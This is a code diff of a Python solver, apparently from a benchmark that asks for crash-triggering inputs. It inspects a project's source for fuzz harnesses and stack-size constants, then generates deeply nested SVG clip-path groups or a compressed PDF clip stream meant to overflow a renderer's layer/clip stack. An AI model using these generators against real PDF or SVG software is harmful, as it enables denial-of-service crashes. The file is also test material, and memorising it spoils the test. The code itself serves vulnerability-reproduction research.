@@ -1,276 +1,259 @@
 import os
 import re
 import tarfile
-from typing import Dict, List, Optional, Tuple
+import zipfile
+import zlib
+from typing import Iterator, Tuple, Optional
 
 
 class Solution:
-    def _read_tar_texts(self, src_path: str, max_file_size: int = 2_000_000, max_files: int = 4000) -> List[Tuple[str, str]]:
-        texts: List[Tuple[str, str]] = []
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                cnt = 0
-                for m in tf.getmembers():
-                    if cnt >= max_files:
-                        break
-                    if not m.isfile():
+    _MAX_TEXT_FILE = 2_000_000
+    _MAX_FILES = 20000
+
+    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
+        if os.path.isdir(src_path):
+            count = 0
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    if count >= self._MAX_FILES:
+                        return
+                    p = os.path.join(root, fn)
+                    try:
+                        st = os.stat(p)
+                    except OSError:
                         continue
-                    name = m.name
-                    ext = os.path.splitext(name)[1].lower()
-                    if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".m", ".mm", ".rs", ".go", ".java", ".py"):
+                    if st.st_size <= 0 or st.st_size > self._MAX_TEXT_FILE:
                         continue
-                    if m.size <= 0 or m.size > max_file_size:
+                    low = fn.lower()
+                    if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or low in ('cmakelists.txt', 'makefile', 'configure.ac')):
                         continue
+                    try:
+                        with open(p, 'rb') as f:
+                            data = f.read(self._MAX_TEXT_FILE + 1)
+                        if len(data) > self._MAX_TEXT_FILE:
+                            continue
+                    except OSError:
+                        continue
+                    count += 1
+                    yield p, data
+            return
+
+        lp = src_path.lower()
+        if lp.endswith('.zip'):
+            count = 0
+            with zipfile.ZipFile(src_path, 'r') as zf:
+                for zi in zf.infolist():
+                    if count >= self._MAX_FILES:
+                        return
+                    if zi.is_dir():
+                        continue
+                    if zi.file_size <= 0 or zi.file_size > self._MAX_TEXT_FILE:
+                        continue
+                    name = zi.filename
+                    low = name.lower()
+                    base = os.path.basename(low)
+                    if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or base in ('cmakelists.txt', 'makefile', 'configure.ac')):
+                        continue
+                    try:
+                        data = zf.read(zi)
+                    except Exception:
+                        continue
+                    if len(data) > self._MAX_TEXT_FILE:
+                        continue
+                    count += 1
+                    yield name, data
+            return
+
+        count = 0
+        with tarfile.open(src_path, 'r:*') as tf:
+            for m in tf:
+                if count >= self._MAX_FILES:
+                    return
+                if not m.isfile():
+                    continue
+                if m.size <= 0 or m.size > self._MAX_TEXT_FILE:
+                    continue
+                name = m.name
+                low = name.lower()
+                base = os.path.basename(low)
+                if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or base in ('cmakelists.txt', 'makefile', 'configure.ac')):
+                    continue
+                try:
                     f = tf.extractfile(m)
                     if f is None:
                         continue
-                    b = f.read()
-                    try:
-                        s = b.decode("utf-8", "ignore")
-                    except Exception:
-                        s = b.decode("latin1", "ignore")
-                    texts.append((name, s))
-                    cnt += 1
-        except Exception:
-            pass
-        return texts
-
-    def _read_dir_texts(self, src_dir: str, max_file_size: int = 2_000_000, max_files: int = 4000) -> List[Tuple[str, str]]:
-        texts: List[Tuple[str, str]] = []
-        cnt = 0
-        for root, _, files in os.walk(src_dir):
-            for fn in files:
-                if cnt >= max_files:
-                    return texts
-                ext = os.path.splitext(fn)[1].lower()
-                if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".m", ".mm", ".rs", ".go", ".java", ".py"):
-                    continue
-                p = os.path.join(root, fn)
-                try:
-                    st = os.stat(p)
-                    if st.st_size <= 0 or st.st_size > max_file_size:
-                        continue
-                    with open(p, "rb") as f:
-                        b = f.read()
-                    try:
-                        s = b.decode("utf-8", "ignore")
-                    except Exception:
-                        s = b.decode("latin1", "ignore")
-                    rel = os.path.relpath(p, src_dir)
-                    texts.append((rel, s))
-                    cnt += 1
+                    data = f.read(self._MAX_TEXT_FILE + 1)
+                    f.close()
                 except Exception:
                     continue
-        return texts
+                if len(data) > self._MAX_TEXT_FILE:
+                    continue
+                count += 1
+                yield name, data
 
-    def _collect_signals(self, texts: List[Tuple[str, str]]) -> Dict[str, object]:
-        fuzzers: List[Tuple[str, str]] = []
-        clip_related: List[Tuple[str, str]] = []
-        all_lower_snippets: List[str] = []
+    def _analyze_source(self, src_path: str) -> Tuple[str, Optional[int]]:
+        harness_texts = []
+        pdf_score = 0
+        svg_score = 0
+        skia_score = 0
 
-        for name, s in texts:
-            sl = s.lower()
-            if "llvmfuzzertestoneinput" in sl:
-                fuzzers.append((name, s))
-            if ("clip mark" in sl) or ("clipmark" in sl) or (("clip" in sl) and ("stack" in sl) and ("nest" in sl)):
-                clip_related.append((name, s))
-            if len(all_lower_snippets) < 50:
-                all_lower_snippets.append(sl[:20000])
-
-        fuzzer_text = "\n".join([t for _, t in fuzzers]).lower()
-        clip_text = "\n".join([t for _, t in clip_related]).lower()
-        any_text = "\n".join(all_lower_snippets)
-
-        return {
-            "fuzzers": fuzzers,
-            "clip_related": clip_related,
-            "fuzzer_text": fuzzer_text,
-            "clip_text": clip_text,
-            "any_text": any_text,
-        }
-
-    def _detect_format(self, signals: Dict[str, object], texts: List[Tuple[str, str]]) -> str:
-        fuzzer_text = signals.get("fuzzer_text", "")
-        any_text = signals.get("any_text", "")
-
-        fuzzer_names = " ".join([n.lower() for n, _ in signals.get("fuzzers", [])])
-
-        svg_hits = 0
-        pdf_hits = 0
-
-        def hit_count(hay: str, needles: List[str]) -> int:
-            c = 0
-            for nd in needles:
-                if nd in hay:
-                    c += 1
-            return c
-
-        svg_hits += hit_count(fuzzer_text, ["svg", "rsvg", "sksvg", "svgnode", "svgdom", "usvg", "resvg", "nanosvg"])
-        svg_hits += hit_count(fuzzer_names, ["svg"])
-        svg_hits += hit_count(any_text, ["clip-path", "clippath", "<svg", "svgdom", "rsvg"])
-
-        pdf_hits += hit_count(fuzzer_text, ["pdf", "mupdf", "poppler", "pdfium", "fpdf", "qpdf", "xpdf", "fz_open_document", "fitz"])
-        pdf_hits += hit_count(fuzzer_names, ["pdf"])
-        pdf_hits += hit_count(any_text, ["%pdf-", "xref", "trailer", "stream", "endobj", "mupdf", "pdfium", "poppler"])
-
-        if svg_hits >= pdf_hits and svg_hits > 0:
-            return "svg"
-        if pdf_hits > 0:
-            return "pdf"
-
-        # Additional heuristic: if project contains many svg-related filenames
-        svg_name_hits = 0
-        pdf_name_hits = 0
-        for name, _ in texts[:2000]:
-            nl = name.lower()
-            if "svg" in nl:
-                svg_name_hits += 1
-            if "pdf" in nl:
-                pdf_name_hits += 1
-        if svg_name_hits >= pdf_name_hits and svg_name_hits > 0:
-            return "svg"
-        if pdf_name_hits > 0:
-            return "pdf"
-
-        return "svg"
-
-    def _infer_depth_target(self, signals: Dict[str, object], texts: List[Tuple[str, str]]) -> int:
-        clip_text = signals.get("clip_text", "")
-        fuzzer_text = signals.get("fuzzer_text", "")
-        combined = (clip_text + "\n" + fuzzer_text).lower()
-
-        candidates: List[int] = []
-
-        # Look for explicit max nesting depth constants.
-        patterns = [
-            r'(?i)#\s*define\s+[a-z0-9_]*nest[a-z0-9_]*depth[a-z0-9_]*\s+(\d{2,6})',
-            r'(?i)#\s*define\s+[a-z0-9_]*depth[a-z0-9_]*\s+(\d{2,6})',
-            r'(?i)\b(?:kmax|max)[a-z0-9_]*nest[a-z0-9_]*depth[a-z0-9_]*\b[^0-9]{0,32}(\d{2,6})',
-            r'(?i)\b(?:kmax|max)[a-z0-9_]*depth[a-z0-9_]*\b[^0-9]{0,32}(\d{2,6})',
-            r'(?i)\b(?:layer|clip)[a-z0-9_]*stack[a-z0-9_]*\s*\[\s*(\d{2,6})\s*\]',
-            r'(?i)std::array\s*<[^>]+,\s*(\d{2,6})\s*>',
+        max_stack_const = None
+        stack_candidate_regexes = [
+            re.compile(r'(?i)\bclip\w*stack\w*\s*\[\s*(\d{1,7})\s*\]'),
+            re.compile(r'(?i)\blayer\w*clip\w*stack\w*\s*\[\s*(\d{1,7})\s*\]'),
+            re.compile(r'(?i)std::array\s*<[^>]+,\s*(\d{1,7})\s*>\s*[^;{]*\bclip\w*stack\b'),
+            re.compile(r'(?i)#define\s+\w*(?:LAYER|CLIP)\w*STACK\w*\s+(\d{1,7})\b'),
+            re.compile(r'(?i)\b(?:const|static)\s+(?:int|unsigned|size_t)\s+\w*(?:Layer|Clip)\w*Stack\w*\s*=\s*(\d{1,7})\b'),
+            re.compile(r'(?i)\b(?:MAX|kMax)\w*(?:Layer|Clip)\w*(?:Stack|Depth)\w*\s*=?\s*(\d{1,7})\b'),
         ]
 
-        def add_from_text(s: str) -> None:
-            for pat in patterns:
-                for m in re.finditer(pat, s):
-                    try:
-                        v = int(m.group(1))
-                    except Exception:
-                        continue
-                    if 64 <= v <= 200000:
-                        candidates.append(v)
-
-        add_from_text(clip_text)
-        add_from_text(fuzzer_text)
-
-        # Also scan a few likely files for relevant numbers near "nest"/"depth"/"stack"
-        for name, s in texts[:600]:
-            sl = s.lower()
-            if ("nest" not in sl and "depth" not in sl and "stack" not in sl) or ("clip" not in sl and "layer" not in sl and "clip" not in name.lower()):
+        for _, data in self._iter_source_files(src_path):
+            try:
+                text = data.decode('utf-8', errors='ignore')
+            except Exception:
                 continue
-            for line in sl.splitlines():
-                if len(line) > 300:
-                    continue
-                if ("nest" in line and "depth" in line) or (("clip" in line or "layer" in line) and "stack" in line):
-                    for m in re.finditer(r'(\d{2,6})', line):
+            low = text.lower()
+
+            if 'llvmfuzzertestoneinput' in low or 'fuzzertestoneinput' in low:
+                harness_texts.append(low)
+
+            if 'mupdf' in low or 'fitz' in low or 'fz_' in low or 'pdfium' in low or 'poppler' in low or 'mupdf/' in low:
+                pdf_score += 3
+            if 'pdf' in low:
+                pdf_score += 1
+
+            if 'librsvg' in low or 'rsvg_' in low or 'rsvghandle' in low or 'rsvg_handle' in low:
+                svg_score += 5
+            if 'nanosvg' in low or 'svg.h' in low or 'svgparse' in low or 'clip-path' in low or 'clippath' in low:
+                svg_score += 2
+            if 'svg' in low:
+                svg_score += 1
+
+            if 'skia' in low or 'skpicture' in low or 'skcanvas' in low:
+                skia_score += 2
+            if '.skp' in low or 'skp' in low:
+                skia_score += 1
+
+            if ('clip' in low and 'stack' in low) or ('layer/clip' in low) or ('layer' in low and 'clip' in low and 'stack' in low):
+                for rgx in stack_candidate_regexes:
+                    for m in rgx.findall(text):
                         try:
-                            v = int(m.group(1))
+                            v = int(m)
                         except Exception:
                             continue
-                        if 64 <= v <= 200000:
-                            candidates.append(v)
+                        if v <= 0 or v > 2_000_000:
+                            continue
+                        if max_stack_const is None or v > max_stack_const:
+                            max_stack_const = v
 
-        if candidates:
-            v = min(candidates)
-            # Often need to exceed the max by 1
-            return min(v + 2, 120000)
+        kind = 'svg'
+        for h in harness_texts:
+            if ('fz_open_document' in h) or ('fz_new_context' in h) or ('mupdf' in h) or ('pdfium' in h) or ('poppler' in h) or ('pdf' in h and 'document' in h):
+                kind = 'pdf'
+                break
+            if ('rsvg_handle' in h) or ('librsvg' in h) or ('svg' in h and 'handle' in h):
+                kind = 'svg'
+                break
 
-        # Infer by integer size hints
-        if "int16_t" in combined and "nest" in combined:
-            return 33000
-        if "uint16_t" in combined and "nest" in combined:
-            return 70000
+        if not harness_texts:
+            if pdf_score > svg_score * 2 and pdf_score >= 8:
+                kind = 'pdf'
+            elif svg_score >= pdf_score and svg_score >= 6:
+                kind = 'svg'
+            elif skia_score > max(pdf_score, svg_score) and skia_score >= 8:
+                kind = 'skia'
+            else:
+                kind = 'svg'
 
-        # Default based on typical 16-bit overflow patterns / ground-truth size
-        return 35000
+        return kind, max_stack_const
 
-    def _gen_svg(self, n: int) -> bytes:
-        # Keep compact but valid XML/SVG
-        pre = (
-            b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
-            b"<defs><clipPath id=\"a\"><rect width=\"1\" height=\"1\"/></clipPath></defs>"
+    def _gen_svg(self, depth: int) -> bytes:
+        if depth < 1:
+            depth = 1
+        if depth > 200000:
+            depth = 200000
+
+        header = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
         )
-        open_tag = b'<g clip-path="url(#a)">'
-        close_tag = b"</g>"
-        mid = b"<rect width=\"1\" height=\"1\"/>"
-        post = b"</svg>"
-        # n can be large; multiplication is efficient.
-        return pre + (open_tag * n) + mid + (close_tag * n) + post
+        open_tag = b'<g clip-path="url(#c)">'
+        close_tag = b'</g>'
+        inner = b'<rect width="1" height="1"/>'
+        footer = b'</svg>'
 
-    def _gen_pdf(self, n: int) -> bytes:
-        # Minimal PDF with a single page and a content stream that deeply nests clip operations.
-        # Each nesting: save graphics state, add rectangle path, clip, end path.
-        # Then restore all.
-        # This is designed to stress layer/clip stacks.
-        one = b"q 0 0 1 1 re W n\n"
-        stream = one * n + (b"Q\n" * n)
+        return header + (open_tag * depth) + inner + (close_tag * depth) + footer
 
-        def obj(num: int, content: bytes) -> bytes:
-            return (str(num).encode("ascii") + b" 0 obj\n" + content + b"\nendobj\n")
+    def _build_pdf(self, compressed_stream: bytes) -> bytes:
+        parts = []
+        offsets = [0]
 
-        o1 = b"<< /Type /Catalog /Pages 2 0 R >>"
-        o2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
-        o3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>"
-        o4 = b"<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n" + stream + b"endstream"
+        def add_obj(obj_num: int, body: bytes) -> None:
+            offsets.append(sum(len(p) for p in parts))
+            parts.append(str(obj_num).encode('ascii') + b' 0 obj\n' + body + b'\nendobj\n')
 
-        parts: List[bytes] = []
-        parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
-        offsets = [0]  # object 0
-        offset = len(parts[0])
+        add_obj(1, b'<< /Type /Catalog /Pages 2 0 R >>')
+        add_obj(2, b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
+        add_obj(3, b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << >> /Contents 4 0 R >>')
 
-        for num, content in [(1, o1), (2, o2), (3, o3), (4, o4)]:
-            offsets.append(offset)
-            bobj = obj(num, content)
-            parts.append(bobj)
-            offset += len(bobj)
+        stream_dict = (
+            b'<< /Length ' + str(len(compressed_stream)).encode('ascii') +
+            b' /Filter /FlateDecode >>\nstream\n'
+        )
+        stream_body = stream_dict + compressed_stream + b'\nendstream'
+        add_obj(4, stream_body)
 
-        # xref
-        xref_start = offset
-        xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
-        for off in offsets[1:]:
-            xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
-        xref = b"".join(xref_lines)
-        parts.append(xref)
-        offset += len(xref)
+        header = b'%PDF-1.4\n%\xE2\xE3\xCF\xD3\n'
+        body = b''.join(parts)
+        xref_start = len(header) + len(body)
+
+        xref = [b'xref\n0 5\n']
+        xref.append(b'0000000000 65535 f \n')
+        for i in range(1, 5):
+            off = len(header) + offsets[i]
+            xref.append(f'{off:010d} 00000 n \n'.encode('ascii'))
+        xref_bytes = b''.join(xref)
 
         trailer = (
-            b"trailer\n"
-            b"<< /Size 5 /Root 1 0 R >>\n"
-            b"startxref\n"
-            + str(xref_start).encode("ascii")
-            + b"\n%%EOF\n"
+            b'trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n' +
+            str(xref_start).encode('ascii') +
+            b'\n%%EOF\n'
         )
-        parts.append(trailer)
-        return b"".join(parts)
+
+        return header + body + xref_bytes + trailer
+
+    def _gen_pdf(self, depth: int) -> bytes:
+        if depth < 1:
+            depth = 1
+        if depth > 2_000_000:
+            depth = 2_000_000
+
+        pattern = b'0 0 1 1 re W n '
+        content = b'q ' + (pattern * depth) + b'n'
+        compressed = zlib.compress(content, 9)
+        return self._build_pdf(compressed)
 
     def solve(self, src_path: str) -> bytes:
-        texts: List[Tuple[str, str]] = []
-        if os.path.isdir(src_path):
-            texts = self._read_dir_texts(src_path)
-        else:
-            texts = self._read_tar_texts(src_path)
+        kind, inferred = self._analyze_source(src_path)
 
-        signals = self._collect_signals(texts)
-        fmt = self._detect_format(signals, texts)
-        n = self._infer_depth_target(signals, texts)
+        if kind == 'pdf':
+            base = 60000
+            depth = base
+            if inferred is not None:
+                depth = max(depth, inferred + 64)
+            return self._gen_pdf(depth)
 
-        # Ensure n stays within reasonable bounds
-        if n < 256:
-            n = 256
-        if n > 120000:
-            n = 120000
+        if kind == 'skia':
+            # Fallback to SVG-like clip nesting; many Skia fuzzers accept SVG through SVG module,
+            # but if not, this still yields a large structured input.
+            base = 35000
+            depth = base
+            if inferred is not None:
+                depth = max(depth, inferred + 64)
+            return self._gen_svg(depth)
 
-        if fmt == "pdf":
-            return self._gen_pdf(n)
-        return self._gen_svg(n)
+        base = 35000
+        depth = base
+        if inferred is not None:
+            depth = max(depth, inferred + 64)
+        return self._gen_svg(depth)
